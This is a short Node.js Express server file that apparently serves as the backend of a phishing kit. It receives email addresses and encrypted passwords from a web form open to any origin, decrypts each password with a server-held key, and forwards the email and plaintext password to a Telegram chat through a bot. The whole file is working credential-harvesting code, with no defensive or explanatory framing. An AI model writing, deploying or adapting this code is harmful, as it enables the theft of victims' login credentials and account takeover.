import express from "express";
import axios from "axios";
import dotenv from "dotenv";
import cors from "cors";
import CryptoJS from "crypto-js";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(
  cors({
    origin: "*", // ["https://bellspwd.onrender.com", "http://127.0.0.1:5500"],
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SECRET_KEY = process.env.SECRET_KEY; // Secret key is in backend only

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
}

// 🔐 Decrypt the password before sending to Telegram
function decryptPassword(encrypted) {
  try {
    const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
    return bytes.toString(CryptoJS.enc.Utf8); // Convert back to plain text
  } catch (error) {
    console.error("Decryption failed:", error);
    return "Decryption Error";
  }
}

app.post("/submit", async (req, res) => {
  try {
    const { email, encryptedPassword } = req.body;
    if (!email || !encryptedPassword) {
      return res
        .status(400)
        .json({ status: "error", message: "Missing fields" });
    }

    const decryptedPassword = decryptPassword(encryptedPassword); // 🔥 Decrypt password

    await sendToTelegram(
      `📧 Email: ${email}\n🔑 Password: ${decryptedPassword}`
    ); // 🔥 Send real password

    res.json({ status: "success", message: "Sent to Telegram securely." });
  } catch (error) {
    console.error("Error processing request:", error);
    res.status(500).json({ status: "error", message: "Server error" });
  }
});

app.listen(PORT, () =>
  console.log(`Server running on http://localhost:${PORT}`)
);
